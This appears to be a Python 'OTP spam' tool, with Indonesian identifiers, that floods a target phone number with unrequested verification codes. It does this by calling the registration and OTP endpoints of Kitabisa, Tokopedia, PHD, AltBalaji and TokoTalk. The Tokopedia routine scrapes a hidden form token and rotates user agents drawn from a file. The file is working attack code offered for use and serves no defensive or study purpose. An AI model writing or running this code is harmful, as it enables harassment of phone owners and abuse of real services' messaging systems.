#!/usr/bin/python
import requests, random, json, time, sys, os, re

# -----------------------WARNA----------------------------
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'

# -------------------------------------------------------
class spam:
    def __init__(self, nomer):
        self.nomer = nomer

    def spam(self):
        try:
            hasil = requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}')
            if hasil.status_code == 200:
                return f'\x1b[92mSpamm kitabisa {self.nomer} \033[1;32mSuccess!'
            elif hasil.status_code == 500:
                return f'\x1b[91mSpamm kitabisa {self.nomer} \x1b[91mFail!'
            else:
                return f'\x1b[91mError: Unexpected response from server (status {hasil.status_code})'
        except Exception as e:
            return f'\x1b[91mError in spam function: {str(e)}'

    def tokped(self):
        try:
            rands = random.choice(open('ua.txt').readlines()).split('\n')[0]
            kirim = {
                'User-Agent': rands,
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Origin': 'https://accounts.tokopedia.com',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            }
            regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+self.nomer, headers=kirim).text
            Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist)
            if Token:
                Token = Token.group(1)
                formulir = {
                    "otp_type": "116",
                    "msisdn": self.nomer,
                    "tk": Token,
                    "email": '',
                    "original_param": "",
                    "user_id": "",
                    "signature": "",
                    "number_otp_digit": "6"
                }
                req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=kirim, data=formulir).text
                if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
                    return f'\x1b[91mSpamm Tokped {self.nomer} \x1b[91mFail!'
                else:
                    return f'\x1b[92mSpamm Tokped {self.nomer} {h}Success!'
            else:
                return f'\x1b[91mError: Token not found'
        except Exception as e:
            return f'\x1b[91mError in tokped function: {str(e)}'

    def phd(self):
        try:
            param = {'phone_number': self.nomer}
            r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
            if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
                return f'\x1b[92mSpamm PHD {self.nomer} {h}Success!'
            else:
                return f'\x1b[91mSpamm PHD {self.nomer} {m}Fail!'
        except Exception as e:
            return f'\x1b[91mError in phd function: {str(e)}'

    def balaji(self):
        try:
            urlb = "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
            kod = "62"
            ata = {
                "country_code": kod,
                "phone_number": self.nomer
            }
            head = {
                "Content-Length": f"{len(str(ata))}",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://lite.altbalaji.com",
                "Save-Data": "on",
                "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
                "Content-Type": "application/json;charset=UTF-8",
                "Referer": "https://lite.altbalaji.com/subscribe?progress=input",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6"
            }
            req = requests.post(urlb, data=json.dumps(ata), headers=head)
            if '{"status":"ok"}' in req.text:
                return f'\x1b[92mSpamm BALAJI {self.nomer} {h}Success!'
            else:
                return f'\x1b[91mSpamm BALAJI {self.nomer} {m}Fail!'
        except Exception as e:
            return f'\x1b[91mError in balaji function: {str(e)}'

    def TokoTalk(self):
        try:
            data = '{"key":"phone","value":"' + str(self.nomer) + '"}'
            head = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
                "content-type": "application/json;charset=UTF-8"
            }
            if 'expireAt' in requests.post("https://api.tokotalk.com/v1/no_auth/verifications", data=data, headers=head).text:
                return f'\x1b[92mSpamm TokoTalk {self.nomer} {h}Success!'
            else:
                return f'\x1b[91mSpamm TokoTalk {self.nomer} {m}Fail!'
        except Exception as e:
            return f'\x1b[91mError in TokoTalk function: {str(e)}'

# باقي الكود يبقى كما هو
